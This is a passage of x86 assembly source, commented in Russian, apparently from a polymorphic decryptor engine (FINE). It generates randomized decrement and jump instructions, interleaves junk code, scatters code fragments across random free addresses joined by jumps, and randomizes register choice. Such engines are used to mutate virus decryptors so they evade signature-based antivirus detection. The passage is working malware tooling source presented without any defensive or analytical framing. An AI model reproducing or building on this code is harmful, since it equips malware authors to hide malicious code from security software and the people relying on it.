  	mov		dword ptr [ebp-40],edi
  	xor		eax,eax 
  	stosd
    pop		eax
    call	gen_trash                        
	ret 
;================================[ADD/SUB/XOR reg2,imm]==================================================  





;======================================[DEC reg1]======================================================== 
instr___dec__reg:
	push	portion
	call	[edx].rgen_addr
	push	eax
	push	portion		
	call	[edx].rgen_addr 
	push	eax
	add		eax,dword ptr [esp+4] 
	call	goto_free_addr
	pop		eax
	call	gen_trash 
;--------------------------------------------------------------------------------------------------------
	push	2									;DEC reg1 или
	call	[edx].rgen_addr						;SUB reg1,1     ? 
	test	eax,eax
	je		_dec__reg1_
;--------------------------------------------------------------------------------------------------------
_sub__reg1_1_:
	mov		al,83h
	stosb
	mov		al,0E8h
	add		al,bh
	stosb
	mov		al,1 
	jmp		_idrendtrash_	 
;--------------------------------------------------------------------------------------------------------
_dec__reg1_: 
	mov		al,bh													;reg1 
	add		al,48h
_idrendtrash_:
	stosb
	pop		eax
	call	gen_trash 
	ret
;======================================[DEC reg1]========================================================  





;=================================[DEC [esp]   JNE imm]================================================== 
instr___dec__addresp:
	push	portion
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr
	push	eax
	add		eax,dword ptr [esp+4]
	call	goto_free_addr
	pop		eax
	call	gen_trash 
;--------------------------------------------------------------------------------------------------------
	push	2									;DEC [esp] или 
	call	[edx].rgen_addr						;SUB [esp],1     ?       
	test	eax,eax
	je		_dec__addresp_
;--------------------------------------------------------------------------------------------------------
_sub__addresp_1_: 
	mov		eax,01242C83h
	stosd
	jmp		_jne__imm_ 

_dec__addresp_: 
	mov		ax,0CFFh
	stosw
	mov		al,24h
	stosb 

_jne__imm_:										;JNE imm 
	push	ecx
	mov		ecx,edi 
	mov		ax,850Fh
	stosw 

	sub		ecx,dword ptr [ebp-32]  
	add		ecx,6
	neg		ecx
	xchg	eax,ecx
	stosd 
	pop		ecx 
	pop		eax
	call	gen_trash 
	ret
;=====================================[DEC [esp]   JNE imm]==============================================  







;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функция goto_free_addr
;получение, переход, а также (если надо) запись мусора и джампа 
;ВХОД:
;eax - размер кода ( в байтах), который надо будет записать по новому полученного рэндомному адресу 
;ВЫХОД:
;edi - новый адрес
;а также (если надо было) запись джампа и мусора 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
goto_free_addr:
	push	eax
	call	get_free_addr						;получаем адрес, по которому точно можно записать нужное количество (в байтах) кода
	push	eax
	jnc		_nojmp_								;проверяем, нужно ли записывать джамп?
	push	edi									;если да, надо, то высчитываем операнд для jmp'a 
	sub		edi,eax
	inc		edi
	inc		edi
	mov		eax,edi 
_abs01_: 
	neg		eax 
	js		_abs01_
_jmpshort0xEB_: 
	cmp		eax,80h 
	jae		_jmpnear0xE9_
	neg		edi
	xchg	edi,dword ptr [esp]
	mov		al,0EBh
	stosb
	pop		eax
	stosb
	jmp		_nextgfa_  
	
_jmpnear0xE9_: 	
	add		edi,3  
	neg		edi    
	xchg	edi,dword ptr [esp]
	mov		al,0E9h								;и записываем jmp 
	stosb 
	pop		eax
	stosd 
_nextgfa_:  
	;mov		eax,min_portion 
	push	min_portion
	call	[edx].rgen_addr						;!!!!! можно закоментить  
	call	gen_trash							;после него запишем для заshitы кусок мусора  

_nojmp_:
	pop		edi
	pop		eax	  
	ret											;выходим 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции goto_free_addr 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функция get_free_addr
;получение рэндомного свободного адреса для записи нужного количества байт 
;ВХОД:
;(+)
;ВЫХОД:
;(+) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
get_free_addr:
	push	edi									;[esp+12] 
	push	esi									;[esp+08]
	push	ecx									;[esp+04] 
	push	eax									;[esp+00] 

_new_addr_:
	push	num_steps							;30 
	pop		esi									;сколько попыток найти свободный адрес в заданном промежутке 
_find_free_addr_:
	dec		esi
	je		_correct_new_addr_					;если все попытки найти свободный адрес закончились (т.е. мы нихера не нашли свободный адрес), изменим наш диапазон поиска, сдвинув его вперед (в строну свободных адресов) 
	push	max_portion							;а вот это диапазон, в котором искать будем свободный адрес  
	call	[edx].rgen_addr
	add		eax,dword ptr [ebp-16]				;добавялем адрес, который является началом данного промежутка 
	xchg	eax,edi
	mov		ecx,dword ptr [esp]					;далее в ecx кладем количество байт, которое надо будет позже записать (это мусорные команды + важные команды (скелет декриптора)) по свободному адресу    
	add		ecx,size_general_instr+5+4+2+min_portion
	xor		eax,eax 
	push	edi   
	repe	scasb								;и проверяем, занято ли данное место? 
	pop		edi 
	jne		_find_free_addr_					;если да, продолжаем искать  
	stosd										;иначе мы нашли свободный адрес, и корректируем edi (edi+=4, это нужно от коллизий)   
	jmp		_ok_new_addr_						;переходим дальше   
_correct_new_addr_: 
	add		dword ptr [ebp-16],min_portion;+1	;изменим диапазон поиска свободных адресов       
	jmp		_new_addr_ 
_ok_new_addr_:
	push	edi
	cmp		edi,dword ptr [esp+4+12]			;если полученный свободный адрес меньше, чем текущий, то ясное дело, нужно записать jmp для перехода на этот новый адрес    
	jle		_jc_ok_
	push	size_general_instr+5+4+2+min_portion  
	pop		ecx									;иначе, проверим, если текущий адрес стоит совсем рядом с новым, то jmp делать не будем, и заполним свободное место между ними мусором 
	std
	xor		eax,eax
	repe	scasb
	cld 
	je		_jc_ok_								;если они рядом не стоят, тогда запишем jmp 
	cmp		edi,dword ptr [esp+4+12]
	jg		_jc_ok_
	mov		edi,dword ptr [esp+4+12]      
	mov		eax,dword ptr [esp]
	sub		eax,edi
	call	gen_trash
	clc
	jmp		_getfaret_     

_jc_ok_:
	stc  
    
_getfaret_:
	pop		eax
	pop		ecx
	pop		ecx
	pop		esi
	pop		edi  
	ret											;выходим  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции get_free_addr  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;вспомогательная функция gen_trash для вызова генератора мусора 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
gen_trash:
	mov		[ebp].buf_for_trash,edi
	mov		[ebp].size_trash,eax
	mov		[ebp].regs,ebx
	push	ebp  
	call	[edx].tgen_addr
	xchg	eax,edi
	ret 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции gen_trash 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функция gen_reg
;генерация занятых регистров (а зяняты они будут в полидекрипторе) 
;ВЫХОД:
;bh - reg1
;bl - reg2 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
gen_reg:
_gen_reg1_: 
	call	random_reg
	cmp		al,4
	je		_gen_reg1_
	cmp		al,5
	je		_gen_reg1_
	xchg	eax,ebx
_gen_reg2_:
	call	random_reg
	cmp		al,4
	je		_gen_reg2_
	cmp		al,5
	je		_gen_reg2_
	cmp		al,bl
	je		_gen_reg2_
	mov		bh,al
	ret 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции gen_reg 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;вспомогательная функция генерации случайного регистра
;ВЫХОД:
;eax - случайный регистр 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
random_reg:
	push	8
	call	[edx].rgen_addr
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции random_reg 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  

 

 

;======================================================================================================== 
FINESize	equ		$ - FINE  

